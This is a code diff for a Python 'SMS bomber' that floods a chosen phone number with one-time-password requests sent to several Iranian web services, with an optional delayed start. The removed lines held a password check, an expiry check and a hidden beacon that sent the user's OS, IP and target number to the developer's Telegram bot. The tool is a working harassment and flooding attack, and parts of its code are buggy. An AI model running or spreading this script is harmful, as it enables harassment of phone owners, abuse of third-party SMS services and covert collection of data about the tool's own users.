@@ -1,149 +1,119 @@
-import platform, os, sys, getpass
+libraries = ["Config", "platform", "os", "sys", "requests", "time", "colorama"]
+def Check(x) :
+    try:
+        exec(f"import {x}")
+    except:
+        sys.exit(f"\033[91m [-] Error (Import-L6) - Install {x}")
+x = [Check(i) for i in libraries]
+import Config, platform, os, sys, requests, time
+from colorama import Fore,init
+init()
 
 System = platform.uname()[0]
 Clear = "cls" if System == "Windows" else "clear"
 os.system (Clear)
 
-libraries = ["Config", "colorama", "requests", "datetime", "time", "socket"]
-
-def Check(x) :
-    try:
-        exec (f"import {x}")
-    except:
-        sys.exit (f"\033[91m [-] Error (Import-L13) - Install {x}")
-
-x = [Check(i) for i in libraries]
-
-import Config, requests, datetime, time, socket
-from colorama import Fore,init
-init()
-
-
 def banner() :
-    print (Fore.YELLOW, f"""
- ╔════════════════════════════════════════════════════════════════════════════════════╗
- ╚═╗ ███████╗███╗   ███╗███████╗ ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  ║
-   ║ ██╔════╝████╗ ████║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ ║
-   ║ ███████╗██╔████╔██║███████╗ ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ ║
-   ║ ╚════██║██║╚██╔╝██║╚════██║ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ ║
-   ║ ███████║██║ ╚═╝ ██║███████║ ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ ║
-   ║ ╚══════╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ║
-   ╚══════════════════════════════════════════════════════════════════════════════════╝
-       [ DEVELOPER: ARTORKI ]  ==  [ BOUGHT ]  ==  [ VERSION: 5 ]  ==  [{Config.expiration}]         
- ══════════════════════════════════════════════════════════════════════════════════════
+    print(Fore.YELLOW, f"""
+ ╔════════════════════════════════════════════════════════╗
+ ╚═╗ ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  ║
+   ║ ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ ║
+   ║ ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ ║
+   ║ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ ║
+   ║ ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ ║
+   ║ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ║
+   ╚══════════════════════════════════════════════════════╝
+         +[ @ARTORKI ]    =+=    [ PRIVATE VERSION ]+        
+ ══════════════════════════════════════════════════════════
 """, Fore.LIGHTCYAN_EX)
-
 banner()
 
-sys.exit ("\033[91m [~] The expiration date has expired !") if f"{Config.expiration}" in str(datetime.datetime.now()) else ...
-
-
 try:
-    connection = requests.get ("http://google.com/")
+    connection = requests.get("http://google.com/")
 except:
-    sys.exit ("\033[91m [-] Error (Connection-L47) - Connect to Internet")
-
-
-password = getpass.getpass (" [SMSB_V5|--> ")
-... if password == f"{Config.password}" else sys.exit ("\n\033[91m [-] Error (Password-L51) - Wrong Password")
-
+    sys.exit("\033[91m [-] Error (Connection-L34) - No Internet")
 
 while True :
-    print (Fore.LIGHTYELLOW_EX, """\n [~] Phone number (t{x} 9*********) :
+    print(Fore.LIGHTYELLOW_EX, """\n [~] Enter Phone Number:
  [C] Contacts
  [E] Exit
 """, Fore.LIGHTCYAN_EX)
-
     try:
-        phone_number = input (" [SMSB_V5|--> ")
+        input_home = input(" [Bomber|--> ")
     except:
-        sys.exit ("\n\033[91m [-] Error (Values-L63) - Wrong Number")
+        sys.exit("\n\033[91m [-] Error (Values-L44) - Wrong Number")
 
-    if phone_number == "C" or phone_number == "c" :
-        print (Fore.YELLOW, Config.contacts)
-        input ()
+    if input_home == "C" or input_home == "c" :
+        for i in Config.contacts :
+            print(Fore.YELLOW, i)
+        print(Fore.LIGHTYELLOW_EX, """
+ [D] Delete Contact
+ [N] New Contact
+ [C] Continue
+""", Fore.LIGHTCYAN_EX)
+        try:
+            input_contacts = input(" [Bomber|--> ").lower
+        except:
+            sys.exit("\n\033[91m [-] Error (Values-L57) - Wrong Input")
+        if input_contacts == "d":
+            print(Fore.LIGHTYELLOW_EX, "\n [~] Enter A Number:", Fore.LIGHTCYAN_EX)
+            try:
+                input_delete = eval(input (" [Bomber|--> "))
+                Config.contacts.remove(input_delete)
+            except:
+                sys.exit("\n\033[91m [-] Error (Values-L64) - Wrong Input")
+        elif input_contacts == "n":
+            print(Fore.LIGHTYELLOW_EX, "\n [~] Enter A Phone Number:", Fore.LIGHTCYAN_EX)
+            try:
+                input_new = input(" [Bomber|--> ")
+                Config.contacts.append(input_new)
+            except:
+                sys.exit("\n\033[91m [-] Error (Values-L71) - Wrong Input")
+        elif input_contacts == "c":
+            continue
+        else:
+            sys.exit()
 
-    elif phone_number == "E" or phone_number == "e" :
-        sys.exit ()
-
-    elif phone_number == "" or phone_number[0] == "0" or phone_number[0] == "+" :
-        sys.exit ("\n\033[91m [-] Error (PhoneNumber-L73) - Wrong Number")
-    
-    elif phone_number[0] != "t" and len(phone_number) != 10 or phone_number[0] == "t" and len(phone_number) != 13:
-        sys.exit ("\n\033[91m [-] Error (PhoneNumber-L76) - Wrong Number")
-
+    elif input_home == "" or input_home[0] == "0" or input_home[0] == "+":
+        sys.exit("\n\033[91m [-] Error (PhoneNumber-L78) - Wrong Number")
+    elif input_home[0] != "t" and len(input_home) != 10 or input_home[0] == "t" and len(input_home) != 13:
+        sys.exit("\n\033[91m [-] Error (PhoneNumber-L80) - Wrong Number")
     else:
         break
 
-
-if phone_number[0] == "t" :
-    phone_number = phone_number[:-11]
-    run_time = phone_number[1]
-
-    print (Fore.LIGHTYELLOW_EX, f"\n [~] Start Sending in {run_time} Hours")
-
+if input_home[0] == "t":
+    input_home = input_home[:-11]
+    run_time = input_home[1]
+    print(Fore.LIGHTYELLOW_EX, f"\n [~] Start Sending in {run_time} Hours")
     run_time = int(run_time) * 60
     try:
-        time.sleep (run_time)
+        time.sleep(run_time)
     except:
         sys.exit()
 
-
-date = datetime.datetime.now()
-system = platform.uname()[0] + platform.uname()[2]
-ip = socket.gethostbyname(socket.gethostname())
-
-Message = f"""
-SMS BOMBER V5 ...
-==============================
-[~] OS:  {system}
-[~] IP:  {ip}
-[~] Num:  {phone_number}
-==============================
-{date}
-"""
-
-Payload = {
-"UrlBox" : f"https://api.telegram.org/bot{Config.telegram_token}/sendMessage?text={Message}&chat_id={Config.telegram_chatid}",
-"AgentList":"Mozilla Firefox",
-"VersionList":"HTTP/1.1",
-"MethodList":"Post"
-}
-
-try:
-    Send_Telegram = requests.post ("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", Payload)
-except:
-    sys.exit ("\n\033[91m [-] Error (Requests-L119) - Connection Error")
-
-
+num = 0
 def SMS() :
-    r01 = requests.post ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data={"cellphone": f"+98{phone_number}"})
-    r02 = requests.post ("https://api.snapp.express/mobile/V5/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=4bec0266&optionalVersion=5.6.6&UDID=3245bbc5-3a18-49a3-8b61-23cacb11c41d", data={"cellphone": f"+98{phone_number}"})
-    r03 = requests.post ("https://auth.basalam.com/otp-request", {"mobile": f"0{phone_number}"})
-    r04 = requests.post ("https://bit24.cash/api/auth/check-mobile", data={"mobile": f"0{phone_number}"})
-    r05 = requests.post ("https://api.bitpin.ir/v1/usr/sub_phone/", data={"phone": f"0{phone_number}"})
-    r06 = requests.post ("https://drdr.ir/api/registerEnrollment/verifyMobile", data={"phoneNumber": phone_number, "userType": "PATIENT"})
-    r07 = requests.get (f"https://filmnet.ir/api-v2/access-token/users/0{phone_number}/otp")
-    r08 = requests.get (f"https://api.torob.com/V5/user/phone/send-pin/?phone_number=0{phone_number}")
-    r09 = requests.get (f"https://api.torob.com/V5/user/phone/send-pin/?phone_number=0{phone_number}")
-
-print (Fore.LIGHTGREEN_EX)
-for i in range(1, 2001) :
-
-    try:
+    # time.sleep(5)
+    num =+ 1
+    r01 = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data={"cellphone": f"+98{input_home}"})
+    r02 = requests.post("https://api.snapp.express/mobile/V5/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=4bec0266&optionalVersion=5.6.6&UDID=3245bbc5-3a18-49a3-8b61-23cacb11c41d", data={"cellphone": f"+98{input_home}"})
+    r03 = requests.post("https://auth.basalam.com/otp-request", {"mobile": f"0{input_home}"})
+    r04 = requests.post("https://bit24.cash/api/auth/check-mobile", data={"mobile": f"0{input_home}"})
+    r05 = requests.post("https://api.bitpin.ir/v1/usr/sub_phone/", data={"phone": f"0{input_home}"})
+    r06 = requests.post("https://drdr.ir/api/registerEnrollment/verifyMobile", data={"phoneNumber": input_home, "userType": "PATIENT"})
+    r07 = requests.get(f"https://filmnet.ir/api-v2/access-token/users/0{input_home}/otp")
+    r08 = requests.get(f"https://api.torob.com/V5/user/phone/send-pin/?input_home=0{input_home}")
+    r09 = requests.get(f"https://api.torob.com/V5/user/phone/send-pin/?input_home=0{input_home}")
+    print(f" [+] {num*5} SMS Sent to :  " + input_home)
+    if num <= 5000 :
         SMS()
-        print (" [+] " + str(i*7) + " Sent to :  " + phone_number)
 
-    except:
-        print (Fore.LIGHTRED_EX, """
-[-] Error (Requests-L138) - Error Sending
-[P] Play again
-[E] Exit """)
+print(Fore.LIGHTGREEN_EX)
+try:
+    print(" [+] Start Sending To " + input_home)
+    SMS()
+except:
+    print(Fore.LIGHTRED_EX, "[-] Error (Requests-L116) - Error Sending")
+    sys.exit()
 
-        print (Fore.LIGHTCYAN_EX)
-        error = input (" [SMSB_V5|--> ") .lower()
-
-        print (Fore.LIGHTGREEN_EX) if error == "p" else sys.exit()
-
-else:
-    sys.exit ("\n\n\033[93m [~] Finished")
+sys.exit("\n\n\033[93m [~] Finished")
